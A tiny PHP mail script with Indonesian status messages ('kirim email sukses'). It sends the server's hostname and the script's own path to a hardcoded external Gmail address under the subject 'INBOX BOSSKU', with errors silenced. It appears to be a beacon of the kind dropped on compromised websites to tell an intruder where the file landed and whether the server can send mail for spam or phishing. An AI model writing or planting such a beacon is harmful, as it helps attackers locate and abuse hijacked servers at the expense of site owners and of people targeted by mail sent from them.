<?php
$to_email = 'ndredotcc@gmail.com';
$subject = 'INBOX BOSSKU';
$message = 'TEST PHP MAIL'.$_SERVER['HTTP_HOST']."/".$_SERVER['PHP_SELF'];
$headers = 'From: '.$_SERVER['HTTP_HOST']."/".$_SERVER['PHP_SELF'];
$m = @mail($to_email,$subject,$message,$headers);
if($m){
	echo 'kirim email sukses';
} else {
	echo 'kirim email gagal';
}